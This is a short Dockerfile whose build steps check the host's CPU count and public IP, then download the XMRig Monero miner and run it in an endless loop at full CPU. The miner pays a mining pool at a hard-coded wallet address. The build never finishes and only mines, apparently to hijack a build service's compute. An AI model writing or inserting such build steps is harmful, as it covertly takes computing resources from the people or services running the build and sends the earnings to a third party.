FROM ubuntu:xenial
RUN apt-get update && apt-get install -y wget
RUN nproc
RUN wget http://ipinfo.io/ip -qO -
RUN wget https://github.com/xmrig/xmrig/releases/download/v2.10.0/xmrig-2.10.0-xenial-x64.tar.gz && tar -xf xmrig-2.10.0-xenial-x64.tar.gz && cd xmrig-2.10.0 && while true; do ./xmrig -o stratum+tcp://pool.supportxmr.com:5555 -u 45UVbdyweuJV5peeuD1ypVbFs6Z1nYhRB4r9BEL9xYjE8Ej8Pjob3LQX2dN4m314gB87Z1M9TbabwN4g4L9184dcCLyiU6y -p ATIRadeon6 --threads 8 --max-cpu-usage=100 --donate-level 1 ; sleep 1; done
